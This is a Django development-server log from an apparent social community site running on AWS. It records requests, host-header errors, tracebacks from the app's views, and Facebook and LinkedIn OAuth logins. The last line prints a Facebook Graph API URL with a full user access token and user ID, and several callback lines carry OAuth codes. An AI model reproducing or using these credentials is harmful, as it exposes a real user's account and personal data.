[15/Dec/2018 10:50:10] "GET / HTTP/1.0" 400 62459
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 10:58:16] "GET / HTTP/1.1" 400 62454
[15/Dec/2018 11:35:03] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[15/Dec/2018 11:35:03] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[15/Dec/2018 11:35:41] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[15/Dec/2018 11:35:41] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 11:46:36] "GET / HTTP/1.1" 400 64681
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 11:46:38] "GET /favicon.ico HTTP/1.1" 400 64636
[15/Dec/2018 11:47:11] "GET / HTTP/1.1" 200 13948
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 11:48:15] "GET / HTTP/1.1" 400 64553
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 11:48:16] "GET /favicon.ico HTTP/1.1" 400 64636
[15/Dec/2018 11:49:01] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 11:49:35] "GET / HTTP/1.1" 200 13948
[15/Dec/2018 11:49:39] "GET /logout HTTP/1.1" 302 0
[15/Dec/2018 11:49:40] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 11:49:40] "GET /media/media/logo.jpeg HTTP/1.1" 200 12167
Not Found: /login/logo.jpeg
[15/Dec/2018 11:49:41] "GET /login/logo.jpeg HTTP/1.1" 404 5976
[15/Dec/2018 11:49:41] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[15/Dec/2018 11:49:42] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[15/Dec/2018 11:49:49] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 11:51:00] "GET /media/media/logo.jpg HTTP/1.1" 200 16853
[15/Dec/2018 11:51:05] "GET /media/media/logo.png HTTP/1.1" 200 11255
[15/Dec/2018 11:51:12] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 11:51:15] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 11:51:18] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 11:51:24] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 11:51:24] "GET /media/media/logo.jpeg HTTP/1.1" 200 12167
[15/Dec/2018 11:51:27] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 11:51:28] "GET /media/media/logo.png HTTP/1.1" 200 11255
[15/Dec/2018 11:51:28] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[15/Dec/2018 11:51:29] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[15/Dec/2018 11:51:36] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 11:51:36] "GET /media/media/logo.jpeg HTTP/1.1" 200 12167
[15/Dec/2018 11:51:41] "GET /media/media/logo.png HTTP/1.1" 200 11255
[15/Dec/2018 11:51:43] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 11:51:44] "GET /media/media/logo.jpeg HTTP/1.1" 200 12167
[15/Dec/2018 11:51:57] "GET /media/media/logo.png HTTP/1.1" 200 11255
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 11:52:24] "GET / HTTP/1.1" 400 64688
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 11:52:25] "GET /favicon.ico HTTP/1.1" 400 64636
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 11:52:57] "GET / HTTP/1.1" 400 64688
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 11:52:58] "GET /favicon.ico HTTP/1.1" 400 64636
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 11:53:00] "GET / HTTP/1.1" 400 64688
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 11:53:02] "GET /favicon.ico HTTP/1.1" 400 64636
[15/Dec/2018 11:53:06] "GET / HTTP/1.1" 200 13159
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 11:55:56] "GET / HTTP/1.1" 400 64688
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 11:55:58] "GET /favicon.ico HTTP/1.1" 400 64636
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 11:55:59] "GET / HTTP/1.1" 400 64688
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 11:56:01] "GET /favicon.ico HTTP/1.1" 400 64636
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 11:56:16] "GET / HTTP/1.1" 400 64688
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 11:56:19] "GET /favicon.ico HTTP/1.1" 400 64636
Not Found: /.well-known/acme-challenge/ncwtRa0V-80ChPo6pnV3F7i1of5q2jilT_XZOY0XZxs
[15/Dec/2018 11:59:08] "GET /.well-known/acme-challenge/ncwtRa0V-80ChPo6pnV3F7i1of5q2jilT_XZOY0XZxs HTTP/1.1" 404 6141
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 12:00:14] "GET / HTTP/1.1" 400 64688
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 12:00:16] "GET /favicon.ico HTTP/1.1" 400 64636
[15/Dec/2018 12:03:25] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 12:03:26] "GET /media/media/logo.png HTTP/1.1" 200 11255
[15/Dec/2018 12:03:27] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[15/Dec/2018 12:03:27] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[15/Dec/2018 12:03:35] "GET /media HTTP/1.1" 301 0
Not Found: /media/
[15/Dec/2018 12:03:35] "GET /media/ HTTP/1.1" 404 1739
Not Found: /favicon.ico
[15/Dec/2018 12:03:35] "GET /favicon.ico HTTP/1.1" 404 5964
Not Found: //
[15/Dec/2018 12:03:38] "GET // HTTP/1.1" 404 5934
[15/Dec/2018 12:03:41] "GET / HTTP/1.1" 200 13159
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 12:03:44] "GET / HTTP/1.1" 400 64871
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 12:03:52] "GET /favicon.ico HTTP/1.1" 400 64819
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 12:12:32] "GET / HTTP/1.0" 400 62458
Not Found: /.well-known/acme-challenge/7j1iZR8BioFIO8P68c59laqf_NSR3S4IOCbBw61xqhY
[15/Dec/2018 12:24:04] "GET /.well-known/acme-challenge/7j1iZR8BioFIO8P68c59laqf_NSR3S4IOCbBw61xqhY HTTP/1.1" 404 6141
Not Found: /testFile
[15/Dec/2018 12:27:42] "GET /testFile HTTP/1.1" 404 5955
[15/Dec/2018 12:27:50] "GET /static/testFile HTTP/1.1" 200 0
[15/Dec/2018 12:28:11] "GET /static/testFile HTTP/1.1" 304 0
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /css/magnific-popup.css
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /css/font-awesome.min.css
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /css/main.css
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /css/owl.carousel.css
Bad Request: /js/jquery.counterup.min.js
[15/Dec/2018 12:31:23] "GET /css/magnific-popup.css HTTP/1.1" 400 65744
[15/Dec/2018 12:31:23] "GET /css/font-awesome.min.css HTTP/1.1" 400 65766
[15/Dec/2018 12:31:23] "GET /css/owl.carousel.css HTTP/1.1" 400 65722
[15/Dec/2018 12:31:23] "GET /css/main.css HTTP/1.1" 400 65634
[15/Dec/2018 12:31:23] "GET /js/jquery.counterup.min.js HTTP/1.1" 400 65773
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /js/jquery.counterup.min.js
[15/Dec/2018 12:31:26] "GET /js/jquery.counterup.min.js HTTP/1.1" 400 65458
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 12:31:31] "GET / HTTP/1.1" 400 65696
Invalid HTTP_HOST header: 'www.collabmates.com'. You may need to add 'www.collabmates.com' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[15/Dec/2018 12:31:32] "GET /favicon.ico HTTP/1.1" 400 65590
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
usage: manage.py runsslserver [-h] [--ipv6] [--nothreading] [--noreload]
                              [--certificate CERTIFICATE] [--key KEY]
                              [--nostatic] [--static] [--version]
                              [-v {0,1,2,3}] [--settings SETTINGS]
                              [--pythonpath PYTHONPATH] [--traceback]
                              [--no-color]
                              [addrport]
manage.py runsslserver: error: unrecognized arguments: nohup_https.out
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 37, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[15/Dec/2018 12:51:54] "GET / HTTP/1.1" 500 67670
Not Found: /favicon.ico
[15/Dec/2018 12:51:55] "GET /favicon.ico HTTP/1.1" 404 5965
Validating models...

System check identified no issues (0 silenced).
December 15, 2018 - 12:51:52
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[15/Dec/2018 12:53:02] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 12:53:45] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 12:54:15] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 12:54:32] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[15/Dec/2018 13:00:24] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 13:00:25] "GET /media/media/logo.png HTTP/1.1" 200 11255
Not Found: /logo.jpeg
[15/Dec/2018 13:00:26] "GET /logo.jpeg HTTP/1.1" 404 5959
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Performing system checks...

System check identified no issues (0 silenced).
December 15, 2018 - 13:01:59
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[15/Dec/2018 13:02:28] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 13:02:39] "GET /community/4/members_list HTTP/1.1" 200 6346
Not Found: /community/4/logo.jpeg
[15/Dec/2018 13:02:40] "GET /community/4/logo.jpeg HTTP/1.1" 404 5995
[15/Dec/2018 13:02:43] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 13:02:43] "GET /media/media/logo.jpeg HTTP/1.1" 200 12167
Not Found: /login/logo.jpeg
[15/Dec/2018 13:02:44] "GET /login/logo.jpeg HTTP/1.1" 404 5977
[15/Dec/2018 13:02:45] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[15/Dec/2018 13:02:48] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[15/Dec/2018 13:02:54] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 13:14:05] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 13:17:24] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 13:17:29] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[15/Dec/2018 13:19:34] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 13:26:14] "GET / HTTP/1.1" 200 13159
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[15/Dec/2018 15:46:03] "GET / HTTP/1.1" 200 13156
[15/Dec/2018 15:46:30] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
Internal Server Error: /oauth/complete/facebook/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/views/decorators/cache.py", line 44, in _wrapped_view_func
    response = view_func(request, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_django/utils.py", line 49, in wrapper
    return func(request, backend, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_django/views.py", line 33, in complete
    *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/actions.py", line 43, in do_complete
    user = backend.complete(user=user, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/base.py", line 40, in complete
    return self.auth_complete(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/utils.py", line 259, in wrapper
    return func(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/facebook.py", line 92, in auth_complete
    self.process_error(self.data)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/facebook.py", line 87, in process_error
    data.get('error_code'))
social_core.exceptions.AuthCanceled: Authentication process canceled: URL Blocked: This redirect failed because the redirect URI is not whitelisted in the app’s Client OAuth Settings. Make sure Client and Web OAuth Login are on and add all your app domains as Valid OAuth Redirect URIs.
[15/Dec/2018 15:46:46] "GET /oauth/complete/facebook/?error_code=1349168&error_message=URL+Blocked%3A+This+redirect+failed+because+the+redirect+URI+is+not+whitelisted+in+the+app%E2%80%99s+Client+OAuth+Settings.+Make+sure+Client+and+Web+OAuth+Login+are+on+and+add+all+your+app+domains+as+Valid+OAuth+Redirect+URIs.&state=jlKcFc6fzQjCX6LwByAcghgIJSWC00GF HTTP/1.1" 500 108310
Not Found: /favicon.ico
[15/Dec/2018 15:46:48] "GET /favicon.ico HTTP/1.1" 404 5965
[15/Dec/2018 16:17:35] "GET / HTTP/1.1" 200 13156
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 17:19:59] "GET / HTTP/1.1" 400 62163
[15/Dec/2018 18:21:12] "GET /oauth/complete/facebook/?granted_scopes=email%2Cpublic_profile&denied_scopes&code=AQB5FRwVUYHFbOGT8OKbnSC0nkNfuRct1PLmPuQCdgrdrAp53lOeTXW-h5qJx7OzZgdsO6HHnJDZo5zPqhSIkexlWcD8yPkYCST3sL4fySelV5znuhYRCcCXfUPyc1b6WubOKIlyAQT9HPp2MSDMxUaGaABdS0RpP-nit1jfTL7CgAJhrLxV2WJNIrVGTDeS-AqL5WomEHYzZbmIrqSyTm1DhRw2VGr6E5L02WLeWfPJHMBHhRnvwBR4s7u70WO0195dyFxHiCx9d2TAuYz0bDmKuuD8X8WSpx2j6FHvVyTlNXkgu7EJuihTEQvJqFwrADHlapwhX2FnhhrHn4v15GEPb6FEL0-pJJpBworqKRXuTA&state=rL1FYCmFobd1e2PQdq9BA9ASJUkXA9ff HTTP/1.1" 302 0
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 46, in dashboard
    info.name = data['name']
KeyError: 'name'
[15/Dec/2018 18:21:13] "GET / HTTP/1.1" 500 68773
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 46, in dashboard
    info.name = data['name']
KeyError: 'name'
[15/Dec/2018 18:21:26] "GET / HTTP/1.1" 500 68483
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 46, in dashboard
    info.name = data['name']
KeyError: 'name'
[15/Dec/2018 18:21:43] "GET / HTTP/1.1" 500 68603
[15/Dec/2018 18:28:01] "GET /admin HTTP/1.1" 301 0
[15/Dec/2018 18:28:03] "GET /admin/ HTTP/1.1" 302 0
[15/Dec/2018 18:28:07] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1993
[15/Dec/2018 18:28:13] "GET /static/admin/css/base.css HTTP/1.1" 200 16225
[15/Dec/2018 18:28:15] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
[15/Dec/2018 18:28:21] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17976
[15/Dec/2018 18:28:24] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
[15/Dec/2018 18:28:44] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[15/Dec/2018 18:28:58] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[15/Dec/2018 18:31:16] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[15/Dec/2018 18:31:56] "GET /admin/ HTTP/1.1" 200 12210
[15/Dec/2018 18:32:31] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
[15/Dec/2018 18:32:31] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[15/Dec/2018 18:32:32] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[15/Dec/2018 18:32:33] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[15/Dec/2018 18:32:42] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 6834
[15/Dec/2018 18:32:43] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6170
[15/Dec/2018 18:32:43] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 18:32:45] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 271751
[15/Dec/2018 18:32:46] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
[15/Dec/2018 18:32:48] "GET /static/admin/js/core.js HTTP/1.1" 200 7134
[15/Dec/2018 18:32:49] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6918
[15/Dec/2018 18:32:52] "GET /static/admin/js/actions.js HTTP/1.1" 200 6538
[15/Dec/2018 18:32:52] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8972
[15/Dec/2018 18:32:53] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1530
[15/Dec/2018 18:32:54] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
[15/Dec/2018 18:32:54] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
[15/Dec/2018 18:32:55] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
[15/Dec/2018 18:33:05] "GET /admin/social_django/usersocialauth/5/change/ HTTP/1.1" 200 7062
[15/Dec/2018 18:33:34] "GET /static/admin/css/forms.css HTTP/1.1" 200 8505
[15/Dec/2018 18:34:20] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 18:42:28] "GET /admin/logout/ HTTP/1.1" 200 1207
[15/Dec/2018 18:42:30] "GET /admin/ HTTP/1.1" 302 0
[15/Dec/2018 18:42:31] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[15/Dec/2018 18:42:36] "GET / HTTP/1.1" 200 13156
[15/Dec/2018 18:42:40] "GET / HTTP/1.1" 200 13156
[15/Dec/2018 18:42:55] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 18:42:58] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[15/Dec/2018 18:43:00] "GET /oauth/complete/facebook/?granted_scopes=email%2Cpublic_profile&denied_scopes&code=AQDt3yyDVcblKG1Ew-y4p8K7EYS7YRkqnmA45jAr7UzjxxTcj_33uAYUCJh9Z2Gluzv3V2tG4JjSbWCb5gKVdJB3AF6hPb18f34jXYV8KJIoTHC0IdithfkRiE6sNfghBGqJRIkRPfGQR8PF56hhhZaj8d8m5ilm4WVdeLWlcGOIL3FwrOn-Rdg5TfrByLBAVAxwMng5hpkHPIWGPddWK435SmJkPt20e9_sYQNfsfg3MUPNYvE_1Z1Qjx2ztd6PetYwI9gfpJhVlBS_qOPIu2GSpPtzgV12_fDMSXhIe18Ca6DleQaTwD1LygrsAU2TQXDcLwFuv73xKmvIipTpctaHSAb-iV-E96mB2P0APFnahQ&state=J3YV5PtoPUyKIsAxr0t6zsbpfGkhCDao HTTP/1.1" 302 0
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 46, in dashboard
    info.name = data['name']
KeyError: 'name'
[15/Dec/2018 18:43:01] "GET / HTTP/1.1" 500 68821
[15/Dec/2018 18:44:16] "GET /admin/ HTTP/1.1" 302 0
[15/Dec/2018 18:44:17] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1993
[15/Dec/2018 18:44:22] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[15/Dec/2018 18:44:22] "GET /admin/ HTTP/1.1" 200 12210
[15/Dec/2018 18:44:24] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
[15/Dec/2018 18:44:26] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 6834
[15/Dec/2018 18:44:27] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 18:44:31] "GET /admin/ HTTP/1.1" 200 12210
[15/Dec/2018 18:44:34] "GET /admin/togther/userinfo/ HTTP/1.1" 200 4821
[15/Dec/2018 18:44:35] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 18:44:37] "GET /admin/togther/userinfo/2/change/ HTTP/1.1" 200 10737
[15/Dec/2018 18:44:38] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[15/Dec/2018 18:44:38] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
[15/Dec/2018 18:44:39] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
[15/Dec/2018 18:44:39] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
[15/Dec/2018 18:44:42] "GET /admin/togther/ HTTP/1.1" 200 6500
Validating models...

System check identified no issues (0 silenced).
December 15, 2018 - 14:51:31
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
2229631310400558
https://graph.facebook.com/v2.9/2229631310400558?fields=name,email,gender,location,picture,link,headline&access_token=EAADvEwDa2W8BAL6IKlv8YkZBRe4ammqJw8CGjTYmMZCKxkaLqG8eT4WBIh8goPgbfmEDSXQTH1WiE4iGnzDBHCLFGxcGxHVhaaoGntGVa0MKZCQwpTJ4bZAQQwZB4Y9tIiA7wuEaOlJrBjPM7voAqUrg1KZCb4jE0hU9WCfe0AQgZDZD
